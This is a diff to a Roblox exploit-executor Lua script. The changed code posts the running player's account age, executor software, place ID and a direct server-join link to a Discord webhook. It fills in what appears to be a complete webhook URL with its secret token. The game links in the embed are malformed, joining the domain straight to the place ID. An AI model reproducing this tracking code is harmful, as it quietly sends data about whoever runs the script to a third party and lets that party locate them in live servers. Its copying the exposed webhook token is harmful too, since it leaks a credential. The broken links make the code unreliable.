@@ -64,8 +64,8 @@ local httpRequest = request or http_request or (syn and syn.request)
 if httpRequest then
 	local HttpService = game:GetService("HttpService")
 	
-	-- USE YOUR RAW, DIRECT DISCORD WEBHOOK URL HERE
-	local webhookUrl = "https://discord.com"
+	-- PASTE YOUR COMPLETE RAW DISCORD WEBHOOK URL HERE
+	local webhookUrl = "https://discord.com/api/webhooks/1548529603658653769/U65oFiT9Qmt1n-pw-XvAUQVmFqqB8LGanAnImk35gzcDIoQC4XAnPrVBTkq1lk8xtJye"
 
 	-- Dynamically detect the Executor being used
 	local executorName = "Unknown Executor"
@@ -92,7 +92,8 @@ if httpRequest then
 							{["name"] = "Account Age (Days)", ["value"] = tostring(LocalPlayer.AccountAge), ["inline"] = true},
 							{["name"] = "Executor Software", ["value"] = tostring(executorName), ["inline"] = true},
 							{["name"] = "Game Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = false},
-							{["name"] = "Direct Link", ["value"] = "[Click to Play](https://roblox.com" .. tostring(game.PlaceId) .. ")", ["inline"] = false}
+							{["name"] = "Direct Link", ["value"] = "[Click to View Game](https://roblox.com" .. tostring(game.PlaceId) .. ")", ["inline"] = true},
+							{["name"] = "Direct Server Join Link", ["value"] = "<roblox-player:1+launchmode:play+gameinfo:" .. tostring(game.JobId) .. "+placeid:" .. tostring(game.PlaceId) .. ">", ["inline"] = false}
 						},
 						["timestamp"] = DateTime.now():ToIsoDate()
 					}}
